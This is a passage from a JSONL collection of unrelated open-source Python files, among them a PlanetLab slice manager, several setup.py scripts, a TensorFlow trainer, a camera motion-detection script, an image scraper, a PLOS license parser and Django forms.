\"netflow\"\n            # and that\"s not quite right\n        except:\n            arch=\"i386\"\n\n        def personality (arch):\n            personality = \"linux32\"\n            if arch.find(\"64\") >= 0:\n                personality = \"linux64\"\n            return personality\n\n        logger.log(\"slicemanager: %s: creating\" % slice)\n        logger.log_call([\"/bin/bash\",\"-x\",\"/usr/sbin/vuseradd\", \"-t\", vref, slice])\n        logger.log(\"slicemanager: %s: created\" % slice)\n\n        # export slicename to the slice in /etc/slicename\n        file(\"/vservers/%s/etc/slicename\" % slice, \"w\").write(slice)\n        file(\"/vservers/%s/etc/slicefamily\" % slice, \"w\").write(vref)\n\n        # set personality: only if needed (if arch\"s differ)\n        if tools.root_context_arch() != arch:\n            file(\"/etc/vservers/%s/personality\" % slice, \"w\").write(personality(arch)+\"\\n\")\n            logger.log(\"slicemanager: %s: set personality to %s\" % (slice, personality(arch)))\n\n        return True\n\n\n    def AddSliceToNode(self, slice, tags, keys):\n        if self.__createSlice__(slice) == True:\n            p = personmanager.PersonManager()\n            p.AddPersonToSlice(slice, keys)\n\n            s = slicetagmanager.SliceTagManager()\n            for tag in tags:\n                s.AddSliceTag(slice, tag[\"tagname\"], tag[\"value\"])\n\n            bwlimit.set(bwlimit.get_xid(slice))\n\n            self.__startSlice__(slice)\n        else:\n            return False\n        return True\n\n    def DeleteSliceFromNode(self, slice):\n        logger.log_call([\"/bin/bash\", \"-x\", \"/usr/sbin/vuserdel\", slice])\n        return True\n"}
{"text": "from setuptools import setup, find_packages\n#from Cython.Build import cythonize\nimport numpy as np\nimport os, sys, glob\n\n__version__ = '0.2' #this needs to be kept up to date with shapelets/__init__.py\n\nsetup(name = 'shapelets',\n    version = __version__,\n    description = 'Shapelet fitting and plotting',\n    long_description = 'Shapelet fitting and plotting',\n    author = 'Griffin Foster',\n    author_email = 'griffin.foster@gmail.com',\n    url = 'https://github.com/griffinfoster/shapelets',\n    platforms = ['*nix'],\n    license='GPL',\n    requires = ['distutils', 'numpy', 'astropy', 'scipy', 'matplotlib', 'json'],\n    provides = ['shapelets', 'shapelets.phs'],\n    packages = ['shapelets', 'shapelets.phs'],\n    #ext_modules = cythonize('shapelets/cshapelet.pyx', annotate=True),\n    include_dirs = [np.get_include()],\n    #scripts = glob.glob('scripts/*.py'),\n    scripts = ['scripts/fitShapelet.py', 'scripts/insertShapelet.py', 'scripts/plotCoeffs.py', 'scripts/plotImg.py', 'scripts/plotShapelets.py', 'scripts/solveShapelet.py'],\n    classifiers = [\n        'Development Status :: 4 - Beta',\n        'Environment :: Console',\n        'Natural Language :: English',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python :: 2.7',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: GNU General Public License (GPL)',\n        'Topic :: Scientific/Engineering :: Astronomy',\n    ],\n)\n\n"}
{"text": "'''\r\nCreated on Jul 9, 2013\r\nUpdated on Aug 5, 2013\r\n\r\n@author: Paul Reesman\r\n\r\n@param plan: A string copied from the output of the SapaReplan planner\r\n\r\nFinds the phrase 'getready' and 'EOP' and sends their indexes to low and high respectfully\r\nCopies only the text between 'getready' and 'EOP' into instruct_plan\r\nLoops through remaining code parsing the text between the '(' and ')'\r\nCreates a list containing the parsed text\r\nAppends the list into instruct_list\r\nReturns the list: instruct_list\r\n'''\r\nclass planner_parser(object):\r\n    def parse(self, plan):\r\n        instruct_list = []\r\n                \r\n        low = plan.find(\"getready\")\r\n        high = plan.find(\"EOP\")\r\n        instruct_plan = plan[low:high]\r\n                \r\n        while not high == -1:\r\n            low = instruct_plan.find(\"(\") + 1\r\n            high = instruct_plan.find(\")\", low + 1)\r\n            if high is not -1:\r\n                instruct_list.append(instruct_plan[low:high].split(\" \"))\r\n                instruct_plan = instruct_plan[high:]\r\n        \r\n        print instruct_list\r\n        return instruct_list\r\n    "}
{"text": "import sys\n\nimport tensorflow as tf\nfrom tensorflow.python.ops import math_ops\n\nsys.path.append(\"slim/\")\n\nslim = tf.contrib.slim\n\nTRAIN_DIR = \"/tmp/tf\"\n\n\nclass Trainer(object):\n  def __init__(self, nb_classes, optimizer, learning_rate):\n    self.nb_classes = nb_classes\n    # learning rate can be a placeholder tensor\n    self.learning_rate = learning_rate\n    self.optimizer = optimizer(learning_rate)\n    self.train_op = None\n    self.prediction = None\n\n  def build(self, predictions, labels, one_hot=False):\n    with tf.name_scope('training'):\n      if one_hot:\n        labels = tf.one_hot(labels, depth=self.nb_classes)\n        labels = tf.squeeze(labels, axis=2)\n        label_shape = tf.shape(labels)[:2]\n        predictions = tf.image.resize_bilinear(predictions, label_shape, name='resize_predictions')\n      else:\n        labels = tf.reshape(labels, (-1, self.nb_clasess))\n        predictions = tf.reshape(predictions, (-1, self.nb_classes))\n      self.prediction = predictions\n      labels = tf.expand_dims(labels, 0)\n      print(\"pred shape {}, label shape {}\".format(predictions.get_shape(), labels.get_shape()))\n      # wraps the softmax_with_entropy fn. adds it to loss collection\n      tf.losses.softmax_cross_entropy(logits=predictions, onehot_labels=labels)\n      # include the regulization losses in the loss collection.\n      total_loss = tf.losses.get_total_loss()\n      self.train_op = slim.learning.create_train_op(total_loss,\n                                                    optimizer=self.optimizer)\n  def add_summaries(self):\n    # Add summaries for images, variables and losses.\n    global_summaries = set([])\n    # image summary\n    image_summary = tf.get_default_graph().get_tensor_by_name('IteratorGetNext:0')\n    image_summary = tf.expand_dims(image_summary, 0)\n    image_summary = tf.summary.image('image', image_summary)\n    global_summaries.add(image_summary)\n    # prediction summary\n    prediction = tf.argmax(self.prediction, axis=3)\n    prediction = tf.cast(prediction, tf.float32)\n    prediction = tf.expand_dims(prediction, 3)\n    image_summary = tf.summary.image('prediction', prediction)\n    global_summaries.add(image_summary)\n    for model_var in slim.get_model_variables():\n      global_summaries.add(tf.summary.histogram(model_var.op.name, model_var))\n    # total loss\n    total_loss_tensor = tf.get_default_graph().get_tensor_by_name('training/total_loss:0')\n    global_summaries.add(tf.summary.scalar(total_loss_tensor.op.name, total_loss_tensor))\n    # Merge all summaries together.\n    summary_op = tf.summary.merge(list(global_summaries), name='summary_op')\n    return summary_op\n\n  def train(self, iterator,\n            filename,\n            restore_fn=None,\n            _add_summaries = True,\n            number_of_steps=10000,\n            save_interval_secs = 12000,\n            same_summaries_secs=120,\n            keep_checkpoint_every_n_hours=5):\n    summary_op = None\n    if _add_summaries:\n      summary_op = self.add_summaries()\n    # Save checkpoints regularly.\n    saver = tf.train.Saver(\n        keep_checkpoint_every_n_hours=keep_checkpoint_every_n_hours)\n    # init fn for the dataset ops and checkpointin\n    def initializer_fn(sess):\n        input_tensor = tf.get_default_graph().get_tensor_by_name('training_data/input:0')\n        sess.run(iterator.initializer, feed_dict={input_tensor: filename})\n        if restore_fn:\n          restore_fn(sess)\n    init_fn = initializer_fn\n    # Soft placement allows placing on CPU ops without GPU implementation.\n    session_config = tf.ConfigProto(allow_soft_placement=True,\n                                    log_device_placement=False)\n    # train\n    slim.learning.train(train_op=self.train_op,\n                        logdir=TRAIN_DIR,\n                        session_config=session_config,\n                        summary_op=summary_op,\n                        init_fn=init_fn,\n                        save_interval_secs = save_interval_secs,\n                        number_of_steps=number_of_steps,\n                        save_summaries_secs=same_summaries_secs,\n                        saver=saver)\n"}
{"text": "\"\"\" Uses camera and takes images for documentation of motion \"\"\"\nimport time\nfrom PIL import Image\nimport urllib\nimport StringIO\nimport settings\n\n\nuser = settings.cam_user\npwd = settings.cam_pwd\ncam_url = settings.cam_url\n\n\ndef fetch_snapshot_image():\n    im = StringIO.StringIO(urllib.urlopen(settings.cam_url).read())\n    return im\n\ndef dummy():\n    img = Image.open(im)\n    r = requests.get(settings.cam_url, auth=(user, pwd), stream=True)\n    if r.status_code == 200:\n        imageData = StringIO.StringIO()\n        imageData.write(r.raw)\n        imageData.seek(0)\n        return imageData\n    return None\n\n\ndef compare(buffer1, buffer2, threshold=0):\n    \"\"\"\n        diffs images by pixels and exits if diffs exceeds threshold\n        code taken from script written by brainflakes posted at raspberry\n        forum. http://www.raspberrypi.org/phpBB3/viewtopic.php?t=45235\n    \"\"\"\n    # Count changed pixels\n    changedPixels = 0\n    print \"In compare buf1: %s buf2: %s\" % (buffer1, buffer2)\n    for x in xrange(0, 100):\n        # Scan one line of image then check sensitivity for movement\n        for y in xrange(0, 75):\n            # Just check green channel as it's the highest quality channel\n            pixdiff = abs(buffer1[x, y][1] - buffer2[x, y][1])\n            if pixdiff > threshold:\n                changedPixels += 1\n\n\nif __name__ == \"__main__\":\n    print \"Starting camera surv\"\n    counter = 0\n    prev_img = None\n    while counter < 50:\n        img = fetch_snapshot_image()\n        print \"found img: %s\" % img\n        if img is not None and prev_img is not None:\n            print \"Doing comparison\"\n            im = Image.open(img)\n            buf = im.load()\n            prev_im = Image.open(prev_img)\n            prev_buf = prev_im.load()\n            print \"Diff in images is: %s\" % compare(prev_buf, buf)\n            im.close()\n            prev_im.close()\n        prev_img = img\n        time.sleep(1)\n"}
{"text": "from __future__ import print_function\n\nfrom sympy import Symbol, symbols, sin, cos, Rational, expand, simplify, collect\nfrom sympy import Rational as Rat\nfrom galgebra.printer import Format, Eprint, Get_Program\nfrom galgebra.ga import Ga\nfrom math import sqrt\n\nglobal n,nbar,I\n\ndef radius(T):\n    '''\n    This retrieves the radius from a trivector representing a circle\n    '''\n    a=(T*T).scalar()\n    b=((T^n)*(T^n)).scalar()\n    return (-1*a/b)**0.5\n\ndef center(T):\n    global n\n    '''returns the center of a given circle trivector'''\n    return T*n*T\n\ndef split_bivector(B):\n    global ebar\n    '''Implements the algorithm described in Doran and Lasenby to recover null vectors wedging to B'''\n    print('B =',B)\n    print('B**2 =',B*B)\n    NB = B.norm()\n    print('NB =',NB)\n    Bh = B/NB\n    ap = ebar - ((ebar^Bh)*Bh)\n    a1 = ap + (ap*Bh)\n    a2 = ap - (ap*Bh)\n    #print '#a1 = ',a1\n    #print '#a2 = ',a2\n    return [a1,a2]\n\ndef norm(X):\n    Y=sqrt((X*X).scalar())\n    return Y\n\nGet_Program(True)\nEprint()\n\ng='1 0 0 0, \\\n   0 1 0 0, \\\n   0 0 0 2, \\\n   0 0 2 0'\n\nc2d = Ga('e_1 e_2 n \\\\bar{n}',g=g)\n(e1,e2,n,nbar) = c2d.mv()\n\ndef F(x):\n    global n,nbar\n    Fx = ((x*x)*n+2*x-nbar) / 2\n    return(Fx)\n\ne = (n+nbar)/2\nebar = n - e\nI=e1*e2*e*ebar\n\ndef intersect_lines(L1,L2):\n    global I\n    '''\n    Computes the intersection bivector of two conformal lines L1, L2\n    '''\n    C = I*((I*L1)^(I*L2))\n    return C\n\n\nA=F(Rat(1,2)*e1)\nB=F(2*e1)\nC=F(Rat(4,5)*e1+Rat(3,5)*e2)\nD=F(Rat(4,5)*e1-Rat(3,5)*e2)\n\nprint('A =',A)\nprint('B =',B)\nprint('C =',C)\nprint('D =',D)\n\nT=A^B^C\nprint('T =',T)\nU=F(e1)^(F(e2))^F(-1*e1)\nprint('U =',U)\ninter=intersect_lines(U,T)\nprint('inter =',inter)\n\nx,y = split_bivector(inter)\n\nbases = (e1,e2)\nprint(x.proj(bases))\nprint(y.proj(bases))\n\n\nprint('One intersection point x = ',x)\nprint('The other intersection point y = ',y)\nprint('x**2 = ',x*x)\nprint('y**2 = ',y*y)\nprint('T^x = ',T^x)\nprint('T^y = ',T^y)\nprint('U^x = ',U^x)\nprint('U^y = ',U^y)\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Copyright (c) 2012-2013 Rapha\u00ebl Barrois\n\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup\n\nroot_dir = os.path.abspath(os.path.dirname(__file__))\n\n\ndef get_version(package_name):\n    version_re = re.compile(r\"^__version__ = [\\\"']([\\w_.-]+)[\\\"']$\")\n    package_components = package_name.split('.')\n    path_components = package_components + ['__init__.py']\n    with open(os.path.join(root_dir, *path_components)) as f:\n        for line in f:\n            match = version_re.match(line[:-1])\n            if match:\n                return match.groups()[0]\n    return '0.1.0'\n\n\nPACKAGE = 'semantic_version'\n\n\nsetup(\n    name=PACKAGE,\n    version=get_version(PACKAGE),\n    author=\"Rapha\u00ebl Barrois\",\n    author_email=\"raphael.barrois+semver@polytechnique.org\",\n    description=\"A library implementing the 'SemVer' scheme.\",\n    license='BSD',\n    keywords=['semantic version', 'versioning', 'version'],\n    url='https://github.com/rbarrois/python-semanticversion',\n    download_url='http://pypi.python.org/pypi/semantic_version/',\n    packages=['semantic_version'],\n    setup_requires=[\n        'setuptools>=0.8',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    test_suite='tests',\n)\n"}
{"text": "from bs4 import BeautifulSoup\nimport time\nfrom spiders_packege.unit.ResourcesDowmloader import ResourcesDownloader\nfrom spiders_packege.unit.ResourcesProcessor import ResourcesProcessor\n\n\n\nclass PageProcessor:\n\n    def __init__(self):\n        pass\n    def dealAllImg(basePath,list,webDriver):\n        baseDetailUrl='http://meitu.xunlei.com/detail.html?id='\n        for oneGirlDict in list:\n            block_detailid=oneGirlDict['block_detailid']\n            girlDetailUrl=baseDetailUrl+block_detailid\n            imgCount=0\n            if '\u82b1\u7d6e' not in oneGirlDict['title']:\n                girlPhotoList=PageProcessor.dealGirlPage(girlDetailUrl,webDriver)\n                for girlPhoto in girlPhotoList:\n                    imgCount=imgCount+1\n                    path=basePath+'\\\\\u3010'+oneGirlDict['name']+'\u3011'+'\u8eab\u9ad8\uff1a'+oneGirlDict['height']\n                    name=str(imgCount)+'.jpg'\n                    ResourcesProcessor.saveFile(girlPhoto,path,name)\n\n\n    def dealGirlPage(url,webDriver):\n        imgResoures=list()\n        webDriver.get(url)\n        time.sleep(1.5)\n        webDriver.page_source.encode('utf-8','ignore') #\u8fd9\u4e2a\u51fd\u6570\u83b7\u53d6\u9875\u9762\u7684html\n        #webDriver.get_screenshot_as_file(\"1.jpg\") #\u83b7\u53d6\u9875\u9762\u622a\u56fe\n        soup = BeautifulSoup(webDriver.page_source, \"html5lib\")\n        imgItems = soup.find_all('img', class_='portrait')\n        imgLen=len(imgItems)/2\n        baseImgUrl=imgItems[0]['src'][0:-5]\n        i=1\n        while i<int(imgLen):\n            imgUrl=baseImgUrl+str(i)+'.jpg'\n            imgObj=ResourcesDownloader.downloadResource(imgUrl)\n            imgResoures.append(imgObj)\n            i=i+1\n        return imgResoures"}
{"text": "import json\nfrom caliopen_storage.helpers.json import JSONEncoder\n\n\ndef dump_indexes(**kwargs):\n    # Discover base core classes\n    from caliopen_main.user.core import User\n    from caliopen_main.contact.objects.contact import Contact\n    from caliopen_main.message.objects.message import Message\n    from caliopen_main.common.objects.tag import ResourceTag\n    from caliopen_storage.core import core_registry\n    _exports = {\n        'contact': ['Contact'],\n        'message': ['Message'],\n    }\n    for keys in _exports:\n        for obj in _exports[keys]:\n            kls = core_registry.get(obj)\n            if not kls:\n                raise Exception('core class %s not found in registry' % obj)\n            output_file = '%s/%s.json' % (kwargs[\"output_path\"], obj.lower())\n            dump_index_mapping(kls._index_class, output_file)\n\n\ndef dump_index_mapping(kls, output_file):\n    \"\"\"Output the json definition  class.\"\"\"\n\n    m = kls.build_mapping().to_dict()\n    with open(output_file, 'w') as f:\n        f.write(json.dumps(m, cls=JSONEncoder,\n                           indent=4, sort_keys=True))\n"}
{"text": "import lxml.etree as et\nimport re\n\n# Creative Commons links\nxlink_href = '{http://www.w3.org/1999/xlink}href'\ncc_by_4_link = 'https://creativecommons.org/licenses/by/4.0/'\ncc_by_3_link = 'https://creativecommons.org/licenses/by/3.0/'\ncc0_link = 'https://creativecommons.org/publicdomain/zero/1.0/'\ncc_by_3_igo_link = 'https://creativecommons.org/licenses/by/3.0/igo/'\ncrown_link = 'http://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/'\ncc_dict = {'CC-BY 4.0': cc_by_4_link,\n           'CC-BY 3.0': cc_by_3_link,\n           'CC0': cc0_link,\n           'CC-BY 3.0 IGO': cc_by_3_igo_link,\n           'Crown Copyright': crown_link,\n           }\n\n\nclass License():\n    \"\"\"For parsing the license element of articles.\"\"\"\n\n    def __init__(self, permissions_element, doi):\n        \"\"\"Initialize an instance of the license class.\"\"\"\n        self.element = permissions_element\n        self.doi = doi\n    \n    def __iter__(self):\n        \"\"\"Provides the ability to cast License as a dictionary using \n        dict(License(\u2026)).\n        \n        Returns a generator of (key, value) tuples, which when passed into \n        dict(), will create the appropriate dictionary. \n        \"\"\"\n        return ((key, value) for key, value in self.license.items())\n    \n    @property\n    def license(self):\n        \"\"\"Dictionary of CC license information from the article license field.\n        \"\"\"\n        lic = ''\n        cc_link = ''\n        copy_year = ''\n        copy_holder = ''\n        permissions = self.element\n        if permissions.xpath('./copyright-year'):\n            copy_year = int(permissions.xpath('./copyright-year')[0].text.strip())\n        if permissions.xpath('./copyright-holder'):\n            try:\n                copy_holder = ', '.join([x.text.strip() for x in permissions.xpath('./copyright-holder')])\n            except AttributeError:\n                print('error getting copyright holder for {}'.format(self.doi))\n\n        license = permissions.xpath('./license')[0]\n        if license.attrib.get(xlink_href):\n            cc_link = license.attrib[xlink_href]\n        elif license.xpath('.//ext-link'):\n            link = license.xpath('.//ext-link')[0]\n            cc_link = link.attrib[xlink_href]\n        if cc_link:\n            if cc_link == cc_by_4_link or any(x in cc_link for x in [\"Attribution\", \"4.0\"]):\n                lic = 'CC-BY 4.0'\n            elif cc_link == cc_by_3_igo_link or 'by/3.0/igo' in cc_link:\n                lic = 'CC-BY 3.0 IGO'\n            elif cc_link == cc_by_3_link or 'by/3.0' in cc_link:\n                lic = 'CC-BY 3.0'\n            elif cc_link == cc0_link or 'zero/1.0/' in cc_link:\n                lic = 'CC0'\n            elif cc_link == 'http://www.nationalarchives.gov.uk/doc/open-government-licence/open-government-licence.htm' \\\n             or 'open-government-licence' in cc_link:\n                lic = \"Crown Copyright\"\n            elif cc_link == 'http://www.plos.org/oa/':\n                lic = 'CC-BY 3.0 IGO'\n            else:\n                print('not 4.0', self.doi, link.attrib[xlink_href])\n                lic = ''\n        else:\n            lic = self.parse_license(license)\n        lic_dict = {'license': lic,\n                    'license_link': cc_dict.get(lic, ''),\n                    'copyright_holder': copy_holder,\n                    'copyright_year': copy_year}\n        return lic_dict\n\n    def parse_license(self, license):\n        \"\"\"For license elements without external links, figure out the appropriate copyright.\n\n        :param license_element: an article XML element with the tag <license>\n        :return: license name\n        \"\"\"\n        license_text = ' '.join(re.split('\\+|\\n|\\t| ', et.tostring(license, method='text', encoding='unicode')))\n        license_text = ''.join(line.lstrip(' \\t') for line in license_text.splitlines(True))\n        license_text = license_text.replace('\\n', ' ').replace('\\r', '')\n        if any(x in license_text.lower() for x in [\"commons attribution license\", \"creative commons attrib\"]):\n            lic = 'CC-BY 4.0'\n            if any(char.isdigit() for char in license_text):\n                digits = [char for char in license_text if char.isdigit()]\n                # Flag numbers in case it specifies a CC version number\n                print(\"Number found in CC license string for {}\".format(self.doi), digits)\n        elif \"commons public domain\" in license_text.lower() or any(x in license_text for x in ['CC0', 'CCO public', \"public domain\"]):\n            lic = 'CC0'\n        elif \"creative commons\" in license_text.lower():\n            print(self.doi, 'unknown CC', license_text)\n            lic = ''\n        else:\n            if 'Public Library of Science Open-Access License' in license_text:\n                lic = 'CC-BY 4.0'\n            elif \"crown copyright\" in license_text.lower() or \\\n             any(x in license_text for x in ['Open Government Licen', 'Public Sector Information Regulations']):\n                lic = 'Crown Copyright'\n            elif \"WHO\" in license_text:\n                lic = 'CC-BY 3.0 IGO'\n            else:\n                lic = 'CC-BY 4.0'\n        return lic\n"}
{"text": "\nimport logging\nfrom pyvisdk.exceptions import InvalidArgumentError\n\n########################################\n# Automatically generated, do not edit.\n########################################\n\nlog = logging.getLogger(__name__)\n\ndef VmDiskFileQueryFilter(vim, *args, **kwargs):\n    '''The filter for the virtual disk primary file.'''\n    \n    obj = vim.client.factory.create('ns0:VmDiskFileQueryFilter')\n\n    # do some validation checking...\n    if (len(args) + len(kwargs)) < 0:\n        raise IndexError('Expected at least 1 arguments got: %d' % len(args))\n\n    required = [  ]\n    optional = [ 'controllerType', 'diskType', 'matchHardwareVersion', 'thin',\n        'dynamicProperty', 'dynamicType' ]\n\n    for name, arg in zip(required+optional, args):\n        setattr(obj, name, arg)\n\n    for name, value in kwargs.items():\n        if name in required + optional:\n            setattr(obj, name, value)\n        else:\n            raise InvalidArgumentError(\"Invalid argument: %s.  Expected one of %s\" % (name, \", \".join(required + optional)))\n\n    return obj\n    "}
{"text": "## begin license ##\n#\n# \"Meresco Solr\" is a set of components and tools\n#  to integrate Solr into \"Meresco.\"\n#\n# Copyright (C) 2011-2013 Seecr (Seek You Too B.V.) http://seecr.nl\n# Copyright (C) 2012 SURF http://www.surf.nl\n# Copyright (C) 2012-2013 Stichting Kennisnet http://www.kennisnet.nl\n#\n# This file is part of \"Meresco Solr\"\n#\n# \"Meresco Solr\" is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# \"Meresco Solr\" is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with \"Meresco Solr\"; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n#\n## end license ##\n\nfrom meresco.core import Observable\nfrom xml.sax.saxutils import escape as escapeXml\nfrom itertools import chain\n\nclass Fields2SolrDoc(Observable):\n    def __init__(self, transactionName, partname=\"solr\", singularValueFields=None, isSingularValueField=None):\n        Observable.__init__(self)\n        self._transactionName = transactionName\n        self._partname = partname\n        if singularValueFields and isSingularValueField:\n            raise ValueError(\"Use either 'singularValueFields' or 'isSingularValueField'\")\n        self._isSingularValueField = isSingularValueField\n        if singularValueFields:\n            singularValueFields = set(singularValueFields)\n            self._isSingularValueField = lambda name: name in singularValueFields\n\n    def begin(self, name):\n        if name != self._transactionName:\n            return\n        tx = self.ctx.tx\n        tx.join(self)\n\n    def addField(self, name, value):\n        tx = self.ctx.tx\n        valueList = tx.objectScope(self).setdefault(name, [])\n        if not self._isSingularValueField is None:\n            if len(valueList) == 1 and self._isSingularValueField(name):\n                return\n        valueList.append(value)\n\n    def commit(self, id):\n        tx = self.ctx.tx\n        fields = tx.objectScope(self)\n        if not fields:\n            return\n        recordIdentifier = tx.locals[\"id\"]\n        specialFields = [\n            ('__id__', recordIdentifier), \n        ] \n        def fieldStatement(key, value):\n            return '<field name=\"%s\">%s</field>' % (escapeXml(key), escapeXml(value))\n        allFields = ((k, v) for k, vs in fields.items() for v in vs)\n        xml = \"<doc xmlns=''>%s</doc>\" % ''.join(fieldStatement(*args) for args in chain(iter(specialFields), allFields))\n        yield self.all.add(identifier=recordIdentifier, partname=self._partname, data=xml)\n"}
{"text": "# Copyright (C) 2015 Education Advisory Board\n# Copyright (C) 2011-2012 Yaco Sistemas\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#            http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nimport os\nfrom setuptools import setup, find_packages\n\n\ndef read(*rnames):\n    return open(os.path.join(os.path.dirname(__file__), *rnames)).read()\n\n\nsetup(\n    name='djangosaml2_tenant',\n    version='0.22.0',\n    description='pysaml2 integration for multi-tenant in Django',\n    long_description='\\n\\n'.join([read('README'), read('CHANGES')]),\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: WSGI\",\n        \"Topic :: Security\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        ],\n    keywords=\"django,pysaml2,saml2,federated authentication,multi-tenant\",\n    author=\"Education Advisory Board\",\n    author_email=\"msensenbrenn@eab.com\",\n    url=\"https://github.com/advisory/djangosaml2_tenant\",\n    license='Apache 2.0',\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        'pysaml2==2.2.0',\n        'python-memcached==1.48',\n        ],\n    )\n"}
{"text": "from navmazing import NavigateToAttribute\nfrom widgetastic.widget import View\nfrom widgetastic_patternfly import Dropdown\n\nfrom cfme.base.ui import BaseLoggedInPage\nfrom cfme.utils.appliance import Navigatable\nfrom cfme.utils.appliance.implementations.ui import navigator, CFMENavigateStep\nfrom widgetastic_manageiq import PaginationPane, ItemsToolBarViewSelector, Text\n\n\nclass InfraNetworking(Navigatable):\n    def __init__(self, appliance=None):\n        Navigatable.__init__(self, appliance)\n\n\nclass InfraNetworkingView(BaseLoggedInPage):\n    \"\"\"Base view for header and nav checking, navigatable views should inherit this\"\"\"\n\n    @property\n    def in_infra_networking(self):\n        nav_chain = ['Compute', 'Infrastructure', 'Networking']\n        return (\n            self.logged_in_as_current_user and\n            self.navigation.currently_selected == nav_chain)\n\n\nclass InfraNetworkingToolbar(View):\n    \"\"\"The toolbar on the main page\"\"\"\n    policy = Dropdown('Policy')\n\n    view_selector = View.nested(ItemsToolBarViewSelector)\n\n\nclass InfraNetworkingEntities(View):\n    \"\"\"Entities on the main page\"\"\"\n    title = Text('//div[@id=\"main-content\"]//h1')\n\n\nclass InfraNetworkingAllView(InfraNetworkingView):\n    \"\"\"The \"all\" view -- a list\"\"\"\n    @property\n    def is_displayed(self):\n        return (\n            self.in_infra_networking and\n            self.entities.title.text == 'All Switches')\n\n    toolbar = View.nested(InfraNetworkingToolbar)\n    entities = View.nested(InfraNetworkingEntities)\n    paginator = PaginationPane()\n\n\n@navigator.register(InfraNetworking, 'All')\nclass All(CFMENavigateStep):\n    VIEW = InfraNetworkingAllView\n\n    prerequisite = NavigateToAttribute('appliance.server', 'LoggedIn')\n\n    def step(self):\n        self.prerequisite_view.navigation.select('Compute', 'Infrastructure', 'Networking')\n\n    def resetter(self):\n        # Reset view and selection\n        self.view.toolbar.view_selector.select('Grid View')\n"}
{"text": "from django.forms import ModelForm, Textarea, HiddenInput, IntegerField, CharField, Select\nfrom django.utils.translation import ugettext as _\n\nfrom base.models import Tag\nfrom .models import Game, Saga, SagaGame, GameAttribute, GameLink, GameTag, GameUser\n\n\nclass GameForm(ModelForm):\n    class Meta:\n        model = Game\n        fields = [\"title\", \"title_vo\", \"year\", \"infos\", \"image\"]\n        widgets = {\n            \"infos\": Textarea(attrs={\"rows\": 4}),\n        }\n\n\nclass GameAttributeForm(ModelForm):\n\n    class Meta:\n        model = GameAttribute\n        fields = [\"name\", \"value\"]\n\n\nclass GameLinkForm(ModelForm):\n\n    class Meta:\n        model = GameLink\n        fields = [\"name\", \"uri\", \"lang\"]\n\n\nclass GameTagForm(ModelForm):\n    tag_name = CharField(label=_(\"Tag name\"), max_length=100)\n\n    def __init__(self, *args, **kwargs):\n        super(ModelForm, self).__init__(*args, **kwargs)\n\n        self.fields[\"tag\"].required = False\n\n        if hasattr(self.instance, \"tag\"):\n            self.initial[\"tag_name\"] = self.instance.tag.name\n        else:\n            self.initial[\"tag_name\"] = \"\"\n\n    def save(self, commit=True):\n        name = self.cleaned_data.get(\"tag_name\").strip()\n        if self.initial[\"tag_name\"] != name:\n            tag = Tag.objects.get_or_create(name=name)[0]\n            self.instance.tag = tag\n        return super(ModelForm, self).save(commit=commit)\n\n    class Meta:\n        model = GameTag\n        fields = [\"tag\", \"tag_name\", \"infos\"]\n        widgets = {\n            \"tag\": HiddenInput(),\n        }\n\n\nclass SagaForm(ModelForm):\n\n    class Meta:\n        model = Saga\n        fields = [\"title\", \"title_vo\", \"infos\"]\n        widgets = {\n            \"infos\": Textarea(attrs={\"rows\": 4}),\n        }\n\n\nclass SagaGameForm(ModelForm):\n    game_id = IntegerField(label=_(\"Title\"), widget=Select(attrs={\"class\": \"select_game\"}), required=False)\n    game_title = CharField(widget=HiddenInput(), max_length=150, required=False)\n\n    def __init__(self, *args, **kwargs):\n        super(ModelForm, self).__init__(*args, **kwargs)\n\n        if hasattr(self.instance, \"game\"):\n            self.initial[\"game_id\"] = self.instance.game.id\n            self.initial[\"game_title\"] = self.instance.game.title\n            if self.instance.game.year:\n                self.initial[\"game_title\"] += \" (%s)\" % self.instance.game.year\n        else:\n            self.initial[\"game_id\"] = None\n            self.initial[\"game_title\"] = \"\"\n\n    def save(self, commit=True):\n        if self.instance.game is None and self.cleaned_data.get(\"game_id\"):\n            self.instance.game = Game.objects.get(id=int(self.cleaned_data.get(\"game_id\")))\n\n        return super(ModelForm, self).save(commit=commit)\n\n    class Meta:\n        model = SagaGame\n        fields = [\"game_id\", \"game_title\", \"game\"]\n        widgets = {\n            \"game\": HiddenInput(),\n        }\n\n\nclass GameUserForm(ModelForm):\n\n    class Meta:\n        model = GameUser\n        fields = [\"bought\", \"played\", 